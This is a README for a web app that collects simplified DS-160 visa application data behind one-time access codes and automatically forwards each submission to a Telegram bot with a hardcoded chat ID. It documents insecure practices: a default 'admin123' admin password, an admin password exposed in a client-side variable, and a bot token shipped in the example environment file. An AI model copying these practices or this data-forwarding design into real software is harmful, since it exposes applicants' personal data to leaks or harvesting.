# DS-160 Visa Form Application

A full-stack web application for collecting visa application data with one-time access codes and Telegram integration.

## Features

- One-time access code authentication (24-hour validity)
- **Simplified single-page form** for faster completion
- **Automatic Telegram notifications** when codes are generated
- Automatic data submission to Telegram when forms are submitted
- Admin panel for code generation
- Firebase Firestore for data storage
- **Case-insensitive code validation** to prevent copy-paste errors

## Setup Instructions

### 1. Install Dependencies

\`\`\`bash
yarn install
\`\`\`

### 2. Firebase Setup

1. Create a new Firebase project at [https://console.firebase.google.com](https://console.firebase.google.com)
2. Enable Firestore Database
3. Copy your Firebase configuration
4. Create a `.env.local` file based on `.env.example`
5. Add your Firebase credentials

### 3. Firestore Collections

Create these collections in Firestore:

**accessCodes**
- code (string)
- createdAt (timestamp)
- expiresAt (timestamp)
- used (boolean)

**visaApplications**
- All form fields
- submittedAt (timestamp)
- accessCode (string)
- status (string)

### 4. Telegram Bot Setup

The app is configured to use `@password_control_checker_bot`:
- Bot Token: Already configured in `.env.example`
- Chat ID: 1139830029

**No additional setup needed** - just copy `.env.example` to `.env.local`

### 5. Run Development Server

\`\`\`bash
yarn dev
\`\`\`

Open [http://localhost:3000](http://localhost:3000)

## Project Structure

\`\`\`
├── app/
│   ├── page.tsx              # Login page
│   ├── form/page.tsx         # Simplified visa form (single page)
│   ├── success/page.tsx      # Success confirmation
│   ├── admin/page.tsx        # Admin panel
│   ├── api/
│   │   ├── send-telegram/    # Form submission to Telegram
│   │   └── send-code-telegram/ # Code generation to Telegram
│   └── layout.tsx
├── lib/
│   ├── firebase.ts           # Firebase configuration
│   └── types.ts              # TypeScript types
└── package.json
\`\`\`

## Usage

### Admin Workflow
1. Go to `/admin` and login (password: `admin123` or from env)
2. Click "Yeni Kod Oluştur" to generate a new access code
3. **Code is automatically sent to Telegram** 
4. Copy the code and share with user

### User Workflow
1. Enter access code on login page (case-insensitive, whitespace-tolerant)
2. Fill out the simplified visa form (single page, essential fields only)
3. Submit the form
4. Data is saved to Firestore and sent to Telegram
5. Confirmation page is shown

## Recent Improvements

### ✅ Fixed Code Validation Issue
- Codes are now normalized (lowercase, trimmed) to prevent copy-paste errors
- Case-insensitive matching ensures codes work regardless of capitalization

### ✅ Faster Form Experience
- Reduced from 7-step multi-page form to single-page form
- Only essential fields included
- Placeholder examples for all fields

### ✅ Telegram Integration for Code Generation
- New codes are automatically sent to `@password_control_checker_bot`
- Includes code, expiration time, and status
- No manual copying needed

## Environment Variables

See `.env.example` for all required variables. Key variables:

- `NEXT_PUBLIC_FIREBASE_*` - Firebase configuration
- `TELEGRAM_BOT_TOKEN` - Bot token for @password_control_checker_bot
- `TELEGRAM_CHAT_ID` - Your Telegram chat ID (1139830029)
- `NEXT_PUBLIC_ADMIN_PASSWORD` - Admin panel password

## Deployment

Deploy to Vercel:
\`\`\`bash
vercel
\`\`\`

Make sure to add all environment variables in the Vercel dashboard.

## Troubleshooting

### "Geçersiz erişim kodu" Error
- Ensure code hasn't expired (24 hours)
- Ensure code hasn't been used already
- Try copying the code again (whitespace is automatically trimmed)

### Telegram Notifications Not Working
- Verify `TELEGRAM_BOT_TOKEN` is correct in `.env.local`
- Verify `TELEGRAM_CHAT_ID` is correct
- Check that the bot has permission to send messages to the chat

## License

MIT
